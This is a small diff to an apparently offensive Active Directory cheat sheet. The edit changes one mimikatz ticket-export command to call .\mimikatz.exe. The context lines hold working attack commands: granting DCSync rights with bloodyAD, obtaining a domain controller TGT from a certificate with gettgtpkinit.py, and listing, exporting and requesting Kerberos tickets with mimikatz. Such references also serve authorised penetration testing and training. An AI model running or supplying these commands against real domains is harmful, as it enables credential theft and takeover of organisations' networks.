@@ -271,7 +271,7 @@ bloodyAD.py --host $dcip -d $dom -u attacker_user -p :$hash add dcsync user2 # G
 
 # Get the Ticket / Cache
 python3 gettgtpkinit.py $dom/DC01\$ -cert-pfx crt.pfx -pfx-pass $pass out.ccache
-mimikatz "kerberos::list /export" # List and export all the tickets
+.\mimikatz.exe "kerberos::list /export" # List and export all the tickets
 mimikatz "kerberos::ask /target:cifs/dc1.ignite.local" # When will this work ?
 mimikatz "kerberos::tgt" # List TGTs
 mimikatz "kerberos::clist Administrator.cache" # List all ccache files on system
